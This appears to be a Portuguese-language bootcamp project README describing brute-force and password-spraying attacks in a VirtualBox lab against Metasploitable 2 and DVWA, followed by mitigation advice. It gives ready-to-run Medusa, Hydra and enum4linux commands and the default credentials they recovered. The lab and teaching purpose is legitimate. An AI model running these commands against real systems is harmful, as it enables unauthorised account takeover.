# Desafio de Projeto DIO: Simulação de Ataques de Força Bruta e Medidas de Prevenção

Projeto prático desenvolvido para o bootcamp de cibersegurança, utilizando **Kali Linux** e ambientes vulneráveis (**Metasploitable 2** e **DVWA**) em ambiente controlado via VirtualBox.

---

## 🛠️ Arquitetura do Ambiente
- **Máquina Atacante:** Kali Linux (VirtualBox - Host-only / `192.168.56.x`)
- **Máquina Vítima:** Metasploitable 2 (`192.168.56.101`)
- **Ferramentas Utilizadas:** `Medusa`, `Hydra`, `Enum4linux` e `Nmap`.

---

## 📋 Etapas Executadas e Resultados

### 1. Ataque de Força Bruta em FTP (vsFTPd 2.3.4)
- **Comando:** `medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6`
- **Resultado:** Credencial válida encontrada: `msfadmin` / `msfadmin` [SUCCESS]

### 2. Ataque de Força Bruta em Aplicação Web (DVWA)
- **Comando:** `hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V`
- **Resultado:** Credencial válida encontrada: `admin` / `password`

### 3. Enumeração de Serviços e Usuários via SMB (Enum4linux)
- **Comando:** `enum4linux -a 192.168.56.101 | tee enum4linux.txt`
- **Destaques:** Mapeamento de shares abertos (como `/tmp` com permissão de leitura/escrita) e descoberta da política de senhas (comprimento mínimo 0).

### 4. Password Spraying e Força Bruta em SMB (Medusa smbnt)
- **Criação das wordlists:**
  ```bash
  echo -e "user\nmsfadmin\nservice" > smb_users.txt
  echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

---

## 🛡️ Medidas de Mitigação e Recomendações

1. **Políticas de Senhas Fortes:** Eliminar o uso de senhas fracas e padronizadas (como `msfadmin/msfadmin`), exigindo complexidade e tamanho mínimo.
2. **Hardening de Serviços:** Desativar protocolos legados e inseguros (como SMBv1 e FTP sem criptografia).
3. **Monitoramento e Limitação de Tentativas:** Implementar bloqueio automático de IPs ou contas após múltiplas falhas de autenticação para mitigar ataques de força bruta e password spraying.
4. **Controle de Acesso:** Aplicar estritamente o Princípio do Menor Privilégio nas permissões de compartilhamentos de rede e pastas administrativas.

---

## 📂 Arquivos do Repositório

* `users.txt` / `smb_users.txt` — Wordlists de usuários.
* `pass.txt` / `senhas_spray.txt` — Wordlists de senhas.
* `enum4linux.txt` — Log completo da enumeração SMB.
* `/images` — Capturas de tela dos testes realizados.
